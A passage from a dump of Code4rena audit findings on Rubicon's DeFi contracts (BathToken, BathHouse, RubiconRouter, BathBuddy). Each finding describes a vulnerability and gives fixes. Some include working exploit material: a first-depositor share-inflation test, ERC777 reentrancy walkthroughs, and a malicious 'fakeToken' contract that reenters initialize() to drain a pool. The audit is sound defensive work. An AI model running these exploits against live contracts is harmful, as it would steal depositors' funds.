In `BathToken.sol:569-571`, the allocation of shares is calculated as follows: ```js (totalSupply == 0) ? shares = assets : shares = (     assets.mul(totalSupply) ).div(_pool); ```  An early attacker can exploit this by: * Attacker calls `openBathTokenSpawnAndSignal()` with `initialLiquidityNew = 1`, creating a new bath token with `totalSupply = 1` * Attacker transfers a large amount of underlying tokens to the bath token contract, such as `1000000` * Using `deposit()`, a victim deposits an amount less than `1000000`, such as `1000`:     * `assets = 1000`     * `(assets * totalSupply) / _pool = (1000 * 1) / 1000000 = 0.001`, which would round down to `0`     * Thus, the victim receives no shares in return for his deposit  To avoid minting 0 shares, subsequent depositors have to deposit equal to or more than the amount transferred by the attacker. Otherwise, their deposits accrue to the attacker who holds the only share.  ```js it(\"Victim receives 0 shares\", async () => {     // 1. Attacker deposits 1 testCoin first when creating the liquidity pool     const initialLiquidityNew = 1;     const initialLiquidityExistingBathToken = ethers.utils.parseUnits(\"100\", decimals);          // Approve DAI and testCoin for bathHouseInstance     await testCoin.approve(bathHouseInstance.address, initialLiquidityNew, {         from: attacker,     });     await DAIInstance.approve(         bathHouseInstance.address,         initialLiquidityExistingBathToken,         { from: attacker }     );      // Call open creation function, attacker deposits only 1 testCoin     const desiredPairedAsset = await DAIInstance.address;     await bathHouseInstance.openBathTokenSpawnAndSignal(         await testCoin.address,         initialLiquidityNew,         desiredPairedAsset,         initialLiquidityExistingBathToken,         { from: attacker }     );          // Retrieve resulting bathToken address     const newbathTokenAddress = await bathHouseInstance.getBathTokenfromAsset(testCoin.address);     const _newBathToken = await BathToken.at(newbathTokenAddress);      // 2. Attacker deposits large amount of testCoin into liquidity pool     let attackerAmt = ethers.utils.parseUnits(\"1000000\", decimals);     await testCoin.approve(newbathTokenAddress, attackerAmt, {from: attacker});     await testCoin.transfer(newbathTokenAddress, attackerAmt, {from: attacker});      // 3. Victim deposits a smaller amount of testCoin, receives 0 shares     // In this case, we use (1 million - 1) testCoin     let victimAmt = ethers.utils.parseUnits(\"999999\", decimals);     await testCoin.approve(newbathTokenAddress, victimAmt, {from: victim});     await _newBathToken.deposit(victimAmt, victim, {from: victim});          assert.equal(await _newBathToken.balanceOf(victim), 0); }); ```  ## Recommended Mitigation Steps * [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution. * In `_deposit()`, ensure the number of shares to be minted is non-zero:   `require(shares != 0, \"No shares minted\");`    "}, {"title": "```withdrawForETH``` could be used to drain the WETH in ```RubiconRouter.sol```", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/356", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  [RubiconRouter.sol#L475-L492](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L475-L492)   # Vulnerability details  ## Impact  In the ```withdrawForETH``` function in ```RubiconRouter.sol```, the ```targetPool``` may be any contract that implements the ```IBathToken``` interface and returns ```wethAddress``` as its underlying token. The ```withdrawnWETH``` amount could be set to the ```RubiconRouter.sol``` contract's WETH balance so that the contract's entire WETH balance is withdrawn, as long as the ```tagetPool``` does not transfer any WETH to ```RubiconRouter.sol```. The caller of the ```withdrawForETH``` function would then receive the withdraw amount.  ## Proof of Concept  ```     function withdrawForETH(uint256 shares, address targetPool)         external         payable         returns (uint256 withdrawnWETH)     {         IERC20 target = IBathToken(targetPool).underlyingToken();         require(target == ERC20(wethAddress), \"target pool not weth pool\");         require(             IBathToken(targetPool).balanceOf(msg.sender) >= shares,             \"don't own enough shares\"         );         IBathToken(targetPool).transferFrom(msg.sender, address(this), shares);         withdrawnWETH = IBathToken(targetPool).withdraw(shares);         WETH9(wethAddress).withdraw(withdrawnWETH);          //Send back withdrawn native eth to sender         msg.sender.transfer(withdrawnWETH);     } ```  1. Let ```shares``` be equal to the contracts WETH balance.  2. The malicious ```targetPool``` contract returns the ```wethAddress``` as the underlying token on [line 480](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L480).   3. ```targetPool``` returns the max uint256 value for its balanceOf function to pass the require condition on [line 483](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L483) for any value of shares.  4. The transferFrom on [line 486](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L486) does not have to do anything and its withdraw function should return the WETH balance of ```RubiconRouter.sol```.  5. The ```RubiconRouter.sol``` contract will then [withdraw ETH](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L488) equal to the ```withdrawWETH``` amount, which should be equal to the contract's WETH balance.  6. The caller of the ```withdrawForETH``` function receives the withdraw ETH without providing any WETH.   ## Recommended Mitigation Steps:  Check the contract's WETH balance before the caller is supposed to send the WETH and after the WETH is sent to confirm the contract has received enough WETH from the caller.  "}, {"title": "`BathToken.sol#_deposit()` attacker can mint more shares with re-entrancy from hookable tokens", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/350", "labels": ["bug", "duplicate", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557-L568   # Vulnerability details  `BathToken.sol#_deposit()` calculates the actual transferred amount by comparing the before and after balance, however, since there is no reentrancy guard on this function, there is a risk of re-entrancy attack to mint more shares.  Some token standards, such as ERC777, allow a callback to the source of the funds (the `from` address) before the balances are updated in `transferFrom()`. This callback could be used to re-enter the function and inflate the amount.  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557-L568  ```solidity function _deposit(uint256 assets, address receiver)     internal     returns (uint256 shares) {     uint256 _pool = underlyingBalance();     uint256 _before = underlyingToken.balanceOf(address(this));      // **Assume caller is depositor**     underlyingToken.transferFrom(msg.sender, address(this), assets);     uint256 _after = underlyingToken.balanceOf(address(this));     assets = _after.sub(_before); // Additional check for deflationary tokens     ... ```  ### PoC  With a ERC777 token by using the ERC777TokensSender `tokensToSend` hook to re-enter the `deposit()` function.  Given:   -   `underlyingBalance()`: `100_000e18 XYZ`. -   `totalSupply`: `1e18`  The attacker can create a contracts with `tokensToSend()` function, then:  1.   `deposit(1)`     -   preBalance  = `100_000e18`;     -   `underlyingToken.transferFrom(msg.sender, address(this), 1)` 2. reenter using `tokensToSend` hook for the 2nd call: `deposit(1_000e18)`     -   preBalance  = `100_000e18`;     -   `underlyingToken.transferFrom(msg.sender, address(this), 1_000e18)`     -   postBalance = `101_000e18`;     -   assets (actualDepositAmount) = `101_000e18 - 100_000e18 = 1_000e18`;     -   mint `1000` shares; 3. continue with the first `deposit()` call:     -   `underlyingToken.transferFrom(msg.sender, address(this), 1)`     -   postBalance = `101_000e18 + 1`;     -   assets (actualDepositAmount) = `(101_000e18 + 1) - 100_000e18 = 1_000e18 + 1`;     -   mint `1000` shares;  As a result, with only `1 + 1_000e18` transferred to the contract, the attacker minted `2_000e18 XYZ` worth of shares.  ### Recommendation  Consider adding `nonReentrant` modifier from OZ's `ReentrancyGuard`.   "}, {"title": "`RubiconMarket.sol#isClosed()` always returns false, making the market can not be stopped as designed", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/339", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L471-L473   # Vulnerability details  ```solidity     function isClosed() public pure returns (bool closed) {         return false;     } ```  > After close, no new buys are allowed.  Based on context and comments, when the market is closed, offers can only be cancelled (offer and buy will throw).   However, in the current implementation, `isClosed()` always returns `false`, so the checks on whether the market is closed will always pass. (E.g: `can_offer()`, `can_buy()`, etc)  And there is a storage variable called `stopped`, but it's never been used, which seems should be used for `isClosed`.  ### Recommendation  Change to:  ```solidity     function isClosed() public pure returns (bool closed) {         return stopped;     } ```  "}, {"title": "Malicious pools can be deployed through `BathHouse`", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/326", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L153 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L214   # Vulnerability details  ## Title Malicious pools can be deployed through `BathHouse`  ## Impact Reentrancy in `BathToken.initialize()` can be exploited and this allows to create a pool which has a legitimate underlying token (even one for which a pool already exists), and has given full approval of underlying Token to an attacker. While this underlying token will differ from the one returned by  `BathHouse.getBathTokenfromAsset` for that Pool (since the returned token would be the malicious one which reentered `initialize`), the LPs could still deposit actual legitimate tokens to the pool since it is deployed from the BathHouse and has the same name as a legit pool, and loose their deposit to the attacker.  ## Proof of Concept Create a new pool calling `BathHouse.openBathTokenSpawnAndSignal()` and passing as `newBathTokenUnderlying` the address with the following malicious token:  ```solidity // SPDX-License-Identifier: BUSL-1.1  pragma solidity =0.7.6;  import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; import \"@openzeppelin/contracts/access/Ownable.sol\"; import \"../../contracts/rubiconPools/BathToken.sol\";  contract fakeToken is ERC20(\"trueToken\", \"TRUE\"), Ownable {      ERC20 trueToken;     address marketAddress;     uint256 counterApprove;     BathToken bathToken;      function setTrueToken(address _trueTokenAddress) onlyOwner {         trueToken = ERC20(_trueTokenAddress);     }      function setMarketAddress(address _marketAddress) onlyOwner {         marketAddress = _marketAddress;     }      function approve(address spender, uint256 amount) public virtual override returns (bool) {         if (counterApprove == 1) { //first approve is from bathHouse             bathToken = BathToken(msg.sender);             bathToken.initialize(trueToken, owner, owner);             attacked = false;         }         counterApprove++;         _approve(_msgSender(), spender, amount);         return true;     }      function setAndApproveMarket(address _market){         // sets legitimate market after malicious bathToken initialization         bathToken.setMarket(_market);         bathToken.approveMarket();     }      function emptyPool() onlyOwner {         // sends pool tokens to attacker         uint256 poolBalance = trueToken.balanceOf(address(bathToken));         trueToken.transferFrom(address(bathToken), owner, poolBalance);     } } ```  This reenters `BathToken.initialize()` and reassigns the bathHouse role to the fake token, which names itself as the legit token. Also the reentrant call reassigns the legit Token to `underlyingToken` so thet the pool actually contains the legit token, but gives infinite approval for the legit token from the pool to the attacker, who is passed as `market` in the reentrant call.  Since the fakeToken has the bathHouse role, it can set the market to the actual RubiconMarket after the reentrant call.  Code: [BathHouse.openBathTokenSpawnAndSignal](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L153), [BathToken.initialize](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L214)  ## Tools Used Manual analysis  ## Recommended Mitigation Steps Add `onlyBathHouse` modifier to `initialize` function in `BathToken` to avoid reentrancy from malicious tokens.  "}, {"title": "`RubiconMarket` buys can not be disabled if offer matching is disabled", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/317", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L962   # Vulnerability details  ## Impact  In the `RubiconMarket` contract, buys can be disabled with `setBuyEnabled`. However, if `matchingEnabled` is set to `false`, buys can not be disabled as the `require` check is located in the `_buys` function instead of checking `buyEnabled` in the `buy` function.  ## Proof of Concept  [RubiconMarket.sol#L962](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L962)  ```solidity function _buys(uint256 id, uint256 amount) internal returns (bool) {     require(buyEnabled); // @audit-info Buys can not be disabled if offer matching is disabled - this require statement should be moved to `buy` function     if (amount == offers[id].pay_amt) {         if (isOfferSorted(id)) {             //offers[id] must be removed from sorted list because all of it is bought             _unsort(id);         } else {             _hide(id);         }     }      require(super.buy(id, amount));      // If offer has become dust during buy, we cancel it     if (         isActive(id) &&         offers[id].pay_amt < _dust[address(offers[id].pay_gem)]     ) {         dustId = id; //enable current msg.sender to call cancel(id)         cancel(id);     }     return true; } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Move the `require` check for `buyEnabled` to the `buy` function [here](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L662).  "}, {"title": "Use `safeTransfer()`/`safeTransferFrom()` instead of `transfer()`/`transferFrom()`", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/316", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L251   # Vulnerability details  ## Impact  It is a good idea to add a `require()` statement that checks the return value of ERC20 token transfers or to use something like OpenZeppelin\u2019s `safeTransfer()`/`safeTransferFrom()` unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.  However, using `require()` to check transfer return values could lead to issues with non-compliant ERC20 tokens which do not return a boolean value. Therefore, it's highly advised to use OpenZeppelin\u2019s `safeTransfer()`/`safeTransferFrom()`.  ## Proof of Concept  **RubiconRouter.sol**  [L251](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L251): `ERC20(route[route.length - 1]).transfer(to, currentAmount);`\\ [L303](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L303): `ERC20(buy_gem).transfer(msg.sender, fill);`\\ [L320](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L320): `ERC20(buy_gem).transfer(msg.sender, fill);`\\ [L348](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L348): `ERC20(buy_gem).transfer(msg.sender, buy_amt);`\\ [L377](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L377): `ERC20(pay_gem).transfer(msg.sender, max_fill_amount - fill);`\\ [L406](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L406): `ERC20(buy_gem).transfer(msg.sender, _after - _before);`\\ [L471](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L471): `ERC20(targetPool).transfer(msg.sender, newShares);`  **peripheral_contracts/BathBuddy.sol**  [L114](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L114): `token.transfer(recipient, amountWithdrawn);`  **rubiconPools/BathPair.sol**  [L601](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L601): `IERC20(asset).transfer(msg.sender, booty);`\\ [L615](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L615): `IERC20(quote).transfer(msg.sender, booty);`  **rubiconPools/BathToken.sol**  [L353](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L353): `IERC20(filledAssetToRebalance).transfer(`\\ [L357](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L357): `IERC20(filledAssetToRebalance).transfer(msg.sender, stratReward); `\\ [L602](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L602): `underlyingToken.transfer(feeTo, _fee);`\\ [L605](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L605): `underlyingToken.transfer(receiver, amountWithdrawn);`  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider using `safeTransfer()`/`safeTransferFrom()` instead of `transfer()`/`transferFrom()`.  "}, {"title": "Possible token reentrancy in release() of BathBuddy.sol", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/283", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L114   # Vulnerability details  ## Impact If a token with callback capabilities is used as a token to vested, then a malicious beneficiary may get the vested amount back without waiting for the vesting period.  ## Proof of Concept  In the function release, line (<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87>), there\u2019s no modifier to stop reentrancy, in the other contracts it would be the synchronized modifier. If a token could reenter with a hook in a malicious contract (an ERC777 token, for example, which is backwards compatible with ERC20), released token counter array (<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L116>) wouldn\u2019t be updated, enabling the withdrawal of the vested amount before the vesting period ends. A plausible scenario would be:  1) A malicious beneficiary contract B calls the release() function with itself as the recipient, everything goes according to the function, and transfer and callback to the malicious beneficiary contract happens.  2) Contract B contains tokensReceived(), a function in the ERC777 token that allows for callback to the victim contract as you can see here https://twitter.com/transmissions11/status/1496944873760428058/ (This function also can be any function that is analogous to a fallback function that might be implemented in a modified ERC20. As it can be seen, any token that would give the attacker control over the execution flow will suffice.)  3) Inside the tokensReceived() function, a call is made back to the release function.  5) This steps are repeated until vested amount is taken back.  4) This allows for the malicious beneficiary contract to redeem the vested amount while bypassing the vesting period, due to the released token counter array (https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L116) which controls how many tokens are released (https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L101) being updated only after the transferring of all tokens occurs. As this is the case, malicious beneficiary  can get the usual amount that they could withdraw at the time indefinite amount of times (as result of released in line 101 will be 0), thus approximately getting all of their vested amount back without waiting for the vesting period. (fees not included).    There's also precedents of similar bugs that reported, as seen here: https://github.com/code-423n4/2022-01-behodler-findings/issues/154#issuecomment-1029448627   ## Tools used Manual code review, talks with dev  ## Recommended Mitigations Steps 1) Consider adding a mutex such as nonReentrant, or the synchronized modifier used in the other contracts.  2) Implement checks-effects-interactions pattern.  "}, {"title": "maxSellAllAmount and maxBuyAllAmount functions can be unintentionally paused (always revert).", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/282", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L290 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L307   # Vulnerability details  ## Impact The two functions maxSellAllAmount and maxBuyAllAmount will always revert in case at least (100-fee)\\% of user's balance can be matched with orders.    ## Proof of Concept Let say Bob placed an order selling 100 USDC with a low USDT price of 1:0.95.  Alice currently has 50 USDT and they want to maxSellAllAmount into USDC.   The function will pass 50 as amount into RubiconMarket's buyAll function where it fully matches with Bob's order. Here, the buy() function will first transfer alice's 50 USDT in and later 50 * feeBPS / BPS as fee. In this case, alice can not afford to pay.   Therefore, the two functions maxSellAllAmount and maxBuyAllAmount are useless in case user's request can be fully matched.  ## Recommended Mitigation Steps  Add the fee calculating before passing the amount to the RubiconMarket's buyAll, sellAll function.   ```solidity     /// @dev this function takes a user's entire balance for the trade in case they want to do a max trade so there's no leftover dust     function maxBuyAllAmount(         ERC20 buy_gem,         ERC20 pay_gem,         uint256 max_fill_amount     ) external returns (uint256 fill) {         //swaps msg.sender's entire balance in the trade                     uint256 maxAmount = _calcAmountAfterFee(ERC20(buy_gem).balanceOf(msg.sender));                  fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(             buy_gem,             maxAmount,             pay_gem,             max_fill_amount         );         ERC20(buy_gem).transfer(msg.sender, fill);     }      /// @dev this function takes a user's entire balance for the trade in case they want to do a max trade so there's no leftover dust     function maxSellAllAmount(         ERC20 pay_gem,         ERC20 buy_gem,         uint256 min_fill_amount     ) external returns (uint256 fill) {         //swaps msg.sender entire balance in the trade          uint256 maxAmount = _calcAmountAfterFee(ERC20(buy_gem).balanceOf(msg.sender));         fill = RubiconMarket(RubiconMarketAddress).sellAllAmount(             pay_gem,             maxAmount,             buy_gem,             min_fill_amount         );         ERC20(buy_gem).transfer(msg.sender, fill);     }       function _calcAmountAfterFee(uint256 amount) internal view returns (uint256) {         uint256 feeBPS = RubiconMarket(RubiconMarketAddress).getFeeBPS();         return amount.sub(amount.mul(feeBPS).div(10000));     } ```    "}, {"title": "`BathBuddy`  contract's `vestedAmount` function includes fees leading to users being disproportionately rewarded after whale withdraws", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/191", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L103-L104 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L133   # Vulnerability details   ## Impact  When a whale withdraws their tokens and receives rewards from the `BathBuddy` contract the fees they pay will erroneously become part of the calculation performed in function `vestedAmount`. This means that any subsequent withdrawer of funds may receive a disproportionate amount of tokens. The fees paid by a whale could still be much larger than the amount of tokens invested by a minnow.  Althought similar to the issue \"When `BathToken` contract is recipient of fees then users can make disproportionate returns after whales withdraw\" it is not the same issue since fees are always accrued in the `BathBuddy` contract and this cannot be changed. Also, the calculations in are subtly different  However, the outcome is the same. A minnow can receive a disproportionate reward and drain much of the fees from the contract.  The intention of setting the pool as the recipient of the fees was to reward HODLers but, in fact, they will be incentivised to withdraw after a whale does.  ## Proof of Concept  Consider the following scenario.  1. fee is set to 50 BPS (i.e. 0.50%) 2. A whale deposits 200 tokens 3. A minnow deposits 0.01 tokens 4. A `BathBuddy` contract is set up for the `BathToken` contract. 5. The whale withdraws their funds 6. The minnow then withdraws their funds  After step 5, the function `vestedAmount` will return a value that includes the fees paid by the whale. This is because the `BathBuddy` contract is the recipient of all fees. They are not transferred anywhere.  Thus, when the minnow withdraws their funds `releasable` is much larger than the amount they otherwise would have expected. Further [sharesWithdrawn](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L103) is equal to [initialTotalSupply](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L104) in this particular scenario so `mul(sharesWithdrawn).div(initialTotalSupply)` evaluates to `1`. This means that `amount = releaseable`.  A [test](https://github.com/sseefried/codearena-rubicon-2022-05/blob/f5010d845d3713b07a00f3bb96a5608c6d09b047/test/BugsBathBuddy.js#L55-L145) has been written in the private fork that exhibits this behaviour.  ## Tools Used  Manual inspection  ## Recommended Mitigation Steps  Keep a tally of the fees accrued in a separate variable and work out a fairer system for distributing rewards to HODLers.  "}, {"title": "Strategists can take more rewards than they should using the function strategistBootyClaim().", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/157", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/tree/main/contracts/rubiconPools/BathPair.sol#L591-L625   # Vulnerability details  ## Impact Strategists can take more rewards than they should using the function strategistBootyClaim(). Even though the owner trusts strategists fully I think it's recommended to remove such flaws. I think there would be 2 methods to claim more rewards.   ## Proof of Concept Method 1. A strategist can call the function using same asset/quote parameters. Then both of fillCountA and fillCountQ will be same positive values. The first code block for fillCountA(L597-L610) will work same as expected but the second block for fillCountQ(L611-L624) will be executed for the same asset again. Two mappings(totalFillsPerAsset, strategist2Fills) that save rewards will be updated for asset already after the first block  but totalFillsPerAsset and balance of this contract for quote would be still positive as there would be remaining rewards for other strategiets. So the strategist can get paid once more for the same asset.  Method 2. I think a reentrancy attack is possible also because two mappings are updated after transfer funds.  ## Tools Used Solidity Visual Developer of VSCode  ## Recommended Mitigation Steps For Method 1. You can add this require() at the beginning of function.(L595) require(asset != quote, \"asset = quote\");  For Method 2. You can update the state of 2 mappings before transfer. Move L608-L609 to L601 Move L622-L623 to L615  So final code will look like this.(pseudocode)  function strategistBootyClaim(address asset, address quote)     external     onlyApprovedStrategist(msg.sender) {     require(asset != quote, \"asset = quote\");      uint256 fillCountA = strategist2Fills[msg.sender][asset];     uint256 fillCountQ = strategist2Fills[msg.sender][quote];     if (fillCountA > 0) {         uint256 booty = (             fillCountA.mul(IERC20(asset).balanceOf(address(this)))         ).div(totalFillsPerAsset[asset]);          totalFillsPerAsset[asset] -= fillCountA;         strategist2Fills[msg.sender][asset] -= fillCountA;          IERC20(asset).transfer(msg.sender, booty);         emit LogStrategistRewardClaim(             msg.sender,             asset,             booty,             block.timestamp         );     }     if (fillCountQ > 0) {         uint256 booty = (             fillCountQ.mul(IERC20(quote).balanceOf(address(this)))         ).div(totalFillsPerAsset[quote]);          totalFillsPerAsset[quote] -= fillCountQ;         strategist2Fills[msg.sender][quote] -= fillCountQ;          IERC20(quote).transfer(msg.sender, booty);         emit LogStrategistRewardClaim(             msg.sender,             quote,             booty,             block.timestamp         );     } }  "}, {"title": "previewWithdraw calculates shares wrongly", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/140", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L499   # Vulnerability details  The fee is wrongly accounted for in `previewWithdraw`.  ## Impact Function returns wrong result; Additionally, `withdraw(assets,to,from)` will always revert. (The user can still withdraw his assets via other functions).  ## Proof of Concept The `previewWithdraw` function returns *less* shares than the required assets (notice the substraction): ```             uint256 amountWithdrawn;             uint256 _fee = assets.mul(feeBPS).div(10000);             amountWithdrawn = assets.sub(_fee);             shares = convertToShares(amountWithdrawn); ``` This won't work, because if the user wants to receive amount of `assets`, he needs to burn *more* shares than that to account for the fee. Not less. This will also make `withdraw(assets,to,from)` [revert](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L514:#L519), because it takes the amount of shares from `previewWithdraw`, and then checks how much assets were really sent to the user, and verifies that it's at least how much he asked for: ```         uint256 expectedShares = previewWithdraw(assets);         uint256 assetsReceived = _withdraw(expectedShares, receiver);         require(assetsReceived >= assets, \"You cannot withdraw the amount of assets you expected\"); ``` But since the expectedShares is smaller than the original amount, and since `_withdraw` [deducts](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L604) the fee from expectedShares, then always `assets > assetsReceived`, and the function will revert.  ## Recommended Mitigation Steps The amount of shares that `previewWithdraw` should return is: `convertToShares(assets.add(assets.mul(feeBPS).div((10000.sub(feeBPS))))` I prove this mathematically in [this](https://i.ibb.co/hX41vzV/c4wd.jpg) image.  "}, {"title": "Strategists can't be removed", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/118", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L264   # Vulnerability details  There is no option to revoke strategist's privilege. As the strategist is a very strategic role which can effectively steal LP's funds, this is very dangerous.  ## Impact A rogue / compromised / cancelled strategist can not be revoked of permissions.  ## Proof of Concept There's a function to [approve](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L264) a strategist, but no option to revoke the access.  ## Recommended Mitigation Steps Add a function / change the function and allow setting strategist's access to false.  "}, {"title": "Inconsistent Order Book Accounting When Working With Transfer-On-Fee or Deflationary Tokens", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/112", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  